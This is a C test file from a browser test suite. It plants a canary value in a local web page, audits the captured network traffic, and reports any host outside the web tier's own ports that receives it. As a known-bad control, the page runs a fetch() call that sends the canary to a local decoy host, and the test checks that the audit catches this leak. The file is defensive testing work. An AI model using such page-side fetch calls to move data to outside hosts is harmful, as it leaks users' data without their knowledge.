/** @file
 * @brief Browser Group
 *
 * Plant a canary value in the walk the browser makes and watch where it
 * goes. The web tier echoes the value it is given into its answer, so
 * the canary must show up in the captured traffic - and only in traffic
 * to the web tier's own ports on 127.0.0.1. Any other host that sees it
 * is a leak. As a known-bad control the page is then made to send the
 * canary to a decoy host, and the same audit must catch that.
 *
 * Copyright (C) 2026 Maxim Menshikov
 *
 * @author Maxim Menshikov <maximmenshchikov@gmail.com>
 */

#define TE_TEST_NAME    "browser/canary"

#include "te_config.h"
#include "tapi_test.h"
#include "te_string.h"
#include "te_sleep.h"
#include "tsapi_mde.h"
#include "tsapi_mde_mi.h"
#include "tsapi_mde_report.h"
#include "tsapi_mde_web.h"
#include "browser_common.h"

/* The canary: a value the gateway echoes back with four decimals. */
#define CANARY          "31337.4242"
/* Hop budget of the walk carrying it. */
#define CANARY_HOPS     2
/* The decoy host of the control: a different host name and port. */
#define DECOY_PORT      18098
#define DECOY_HOST      "localhost:18098"

/* Hosts seen in the network log. */
#define MAX_HOSTS       16

typedef struct canary_host {
    char         name[128];  /**< host[:port] */
    unsigned int requests;   /**< HTTP requests to it */
    unsigned int hits;       /**< Canary occurrences in those entries */
} canary_host;

typedef struct canary_audit {
    canary_host  host[MAX_HOSTS];
    unsigned int n_hosts;
    unsigned int n_entries;  /**< Entries of the log walked so far */
    unsigned int hits;       /**< Canary occurrences in walked entries */
    unsigned int allowed_hits; /**< ... in entries of the web tier */
} canary_audit;

/* The web tier's own ports: 127.0.0.1:8081..8083. */
static bool
canary_host_allowed(const char *host)
{
    return strcmp(host, "127.0.0.1:8081") == 0 ||
           strcmp(host, "127.0.0.1:8082") == 0 ||
           strcmp(host, "127.0.0.1:8083") == 0;
}

static canary_host *
canary_host_get(canary_audit *audit, const char *name)
{
    unsigned int i;

    for (i = 0; i < audit->n_hosts; i++)
    {
        if (strcmp(audit->host[i].name, name) == 0)
            return &audit->host[i];
    }
    if (audit->n_hosts == MAX_HOSTS)
        return NULL;

    TE_SPRINTF(audit->host[audit->n_hosts].name, "%.127s", name);
    return &audit->host[audit->n_hosts++];
}

/*
 * Walk the entries of the log past those already seen; count requests
 * and canary occurrences per host and add a leak finding for every host
 * outside the web tier that saw the canary.
 */
static void
canary_audit_log(canary_audit *audit, const char *log, tsapi_mde_report *rep)
{
    const char  *cursor = log;
    te_string    entry = TE_STRING_INIT;
    unsigned int idx = 0;

    while (browser_net_next(&cursor, &entry))
    {
        te_string    url = TE_STRING_INIT;
        te_string    host = TE_STRING_INIT;
        unsigned int hits;
        canary_host *h;
        const char  *hname;

        if (idx++ < audit->n_entries)
            continue;

        browser_json_str(entry.ptr, "url", &url);
        if (url.ptr == NULL)
        {
            te_string_free(&url);
            continue;
        }
        browser_url_split(url.ptr, &host, NULL);
        hname = host.ptr != NULL ? host.ptr : "";
        hits = browser_count_substr(entry.ptr, CANARY);
        audit->hits += hits;

        h = canary_host_get(audit, hname);
        if (h != NULL)
        {
            h->requests++;
            h->hits += hits;
        }

        if (hits > 0)
        {
            if (canary_host_allowed(hname))
            {
                audit->allowed_hits += hits;
            }
            else
            {
                tapi_cybersec_report_add(&rep->cyber,
                                         TAPI_CYBERSEC_SEV_CRITICAL,
                                         "browser.canary-leak", hname,
                                         "the canary left the page to %s "
                                         "(%u occurrence(s)) in %s",
                                         hname, hits, url.ptr);
            }
        }
        RING("Captured: %s -> %u canary hit(s)", url.ptr, hits);

        te_string_free(&url);
        te_string_free(&host);
    }
    audit->n_entries = idx;
    te_string_free(&entry);
}

/* Chart the hosts: requests and canary hits per host. */
static void
canary_chart(const canary_audit *audit, const char *title_req,
             const char *title_hits)
{
    const char  *labels[MAX_HOSTS];
    double       req[MAX_HOSTS];
    double       hits[MAX_HOSTS];
    unsigned int i;

    for (i = 0; i < audit->n_hosts; i++)
    {
        labels[i] = audit->host[i].name;
        req[i] = audit->host[i].requests;
        hits[i] = audit->host[i].hits;
        TEST_ARTIFACT("Host %s: %u request(s), %u canary hit(s)%s",
                      audit->host[i].name, audit->host[i].requests,
                      audit->host[i].hits,
                      canary_host_allowed(audit->host[i].name) ?
                          "" : " - outside the web tier");
    }
    tsapi_mde_mi_bars("browser", title_req, TE_MI_MEAS_UNITLESS_VALUE,
                      "requests", audit->n_hosts, labels, req,
                      TE_MI_MEAS_MULTIPLIER_PLAIN);
    tsapi_mde_mi_bars("browser", title_hits, TE_MI_MEAS_UNITLESS_VALUE,
                      "canary_hits", audit->n_hosts, labels, hits,
                      TE_MI_MEAS_MULTIPLIER_PLAIN);
}

int
main(int argc, char **argv)
{
    tapi_cybersec_severity min_severity;
    tsapi_mde_session   session;
    bool                session_up = false;
    tsapi_mde_dut       dut;
    tsapi_mde_web       web;
    bool                web_started = false;
    tapi_playwright    *pw = NULL;
    tapi_job_t         *decoy = NULL;
    tsapi_mde_report    report;
    canary_audit        audit;
    canary_audit        control;
    te_string           url = TE_STRING_INIT;
    te_string           netlog = TE_STRING_INIT;
    te_string           sent = TE_STRING_INIT;
    unsigned int        grep_hits = 0;
    unsigned int        grep_after = 0;
    unsigned int        dump_hits;
    double              t0;
    double              t_capture;

    TEST_START;
    memset(&dut, 0, sizeof(dut));
    memset(&web, 0, sizeof(web));
    memset(&audit, 0, sizeof(audit));
    memset(&control, 0, sizeof(control));
    tsapi_mde_report_init(&report);

    TEST_STEP("Parse test parameters");
    TEST_GET_MDE_SEVERITY(min_severity);

    TEST_STEP("Open a session and locate the example");
    TSAPI_MDE_OPEN_OR_SKIP(session, "browser_canary", dut, session_up);
    if (!tsapi_mde_web_built(&session, &dut))
        TEST_VERDICT("The web tier is not built - build the example first");
    browser_skip_unless_ready(&session);

    TEST_STEP("Start the web tier and a browser that captures its traffic");
    web_started = true;
    CHECK_RC(tsapi_mde_web_start(&session, &dut, &web));
    browser_open(&session, true, false, false, &pw);

    TEST_STEP("Walk the cycle with the canary " CANARY " as the value");
    te_string_append(&url, "http://127.0.0.1:%u/ring?value=" CANARY
                     "&hops=%d", TSAPI_MDE_WEB_GATEWAY_PORT, CANARY_HOPS);
    t0 = tsapi_mde_now();
    CHECK_RC(tapi_playwright_goto(pw, url.ptr));
    CHECK_RC(tapi_playwright_wait_load(pw, TAPI_PLAYWRIGHT_NETWORKIDLE));
    t_capture = tsapi_mde_now() - t0;

    TEST_STEP("Count the canary in the captured traffic, two ways");
    CHECK_RC(tapi_playwright_network_grep(pw, CANARY, &grep_hits));
    CHECK_RC(tapi_playwright_network_dump(pw, &netlog));
    dump_hits = browser_count_substr(netlog.ptr, CANARY);
    canary_audit_log(&audit, netlog.ptr, &report);
    TEST_ARTIFACT("Canary " CANARY ": network_grep %u, network_dump %u, "
                  "%u in %u entr(ies), %u in the web tier's own traffic",
                  grep_hits, dump_hits, audit.hits, audit.n_entries,
                  audit.allowed_hits);
    if (grep_hits != dump_hits || dump_hits != audit.hits)
    {
        TEST_VERDICT("The runner's grep and the network log disagree on "
                     "the canary count");
    }
    if (audit.allowed_hits == 0)
        TEST_VERDICT("The canary never appeared in the captured traffic");
    canary_chart(&audit, "Requests per host (walk)",
                 "Canary hits per host (walk)");

    TEST_STEP("Known-bad control: make the page send the canary to "
              DECOY_HOST);
    if (tsapi_mde_have(&session, "python3"))
    {
        const char *decoy_argv[] = { "python3", "-m", "http.server", "18098",
                                     "--bind", "127.0.0.1", NULL };

        CHECK_RC(tapi_job_create(session.factory, NULL, "python3",
                                 decoy_argv, NULL, &decoy));
        CHECK_RC(tapi_job_start(decoy));
        te_motivated_msleep(1000, "let the decoy HTTP server bind");
    }
    else
    {
        RING("No python3: the decoy request will fail, which is captured "
             "all the same");
    }
    CHECK_RC(tapi_playwright_eval(pw,
                "fetch('http://" DECOY_HOST "/?c=" CANARY "', "
                "{ mode: 'no-cors' }).then(() => 'sent')"
                ".catch((e) => 'failed: ' + e)", &sent));
    RING("Decoy request: %s", sent.ptr);
    CHECK_RC(tapi_playwright_wait_load(pw, TAPI_PLAYWRIGHT_NETWORKIDLE));
    CHECK_RC(tapi_playwright_network_grep(pw, CANARY, &grep_after));
    te_string_reset(&netlog);
    CHECK_RC(tapi_playwright_network_dump(pw, &netlog));
    control.n_entries = audit.n_entries;
    canary_audit_log(&control, netlog.ptr, &report);
    TEST_ARTIFACT("Control: grep %u -> %u, %u new entr(ies) with %u canary "
                  "hit(s)", grep_hits, grep_after,
                  control.n_entries - audit.n_entries, control.hits);
    tsapi_mde_report_expect(&report, "browser.canary-leak", DECOY_HOST);
    tsapi_mde_report_drop_subject(&report, DECOY_HOST);
    canary_chart(&control, "Requests per host (control)",
                 "Canary hits per host (control)");

    TEST_STEP("Chart the capture");
    tsapi_mde_mi_point("browser", "Walk + network idle time", TE_MI_MEAS_TIME,
                       "capture", t_capture, TE_MI_MEAS_MULTIPLIER_PLAIN);
    {
        const char *labels[] = { "grep (walk)", "dump (walk)",
                                 "grep (after control)" };
        double      vals[3];

        vals[0] = grep_hits;
        vals[1] = dump_hits;
        vals[2] = grep_after;
        tsapi_mde_mi_bars("browser", "Canary occurrences in the log",
                          TE_MI_MEAS_UNITLESS_VALUE, "occurrences",
                          TE_ARRAY_LEN(labels), labels, vals,
                          TE_MI_MEAS_MULTIPLIER_PLAIN);
    }

    TEST_STEP("Decide on the findings");
    TSAPI_MDE_REPORT_GATE(&report, "browser", min_severity);

    TEST_SUCCESS;

cleanup:

    tapi_playwright_destroy(pw);
    if (decoy != NULL)
        tapi_job_destroy(decoy, -1);
    if (web_started)
        tsapi_mde_web_stop(&web);
    tsapi_mde_report_free(&report);
    te_string_free(&url);
    te_string_free(&netlog);
    te_string_free(&sent);
    tsapi_mde_dut_free(&dut);
    if (session_up)
        tsapi_mde_session_fini(&session);

    TEST_END;
}
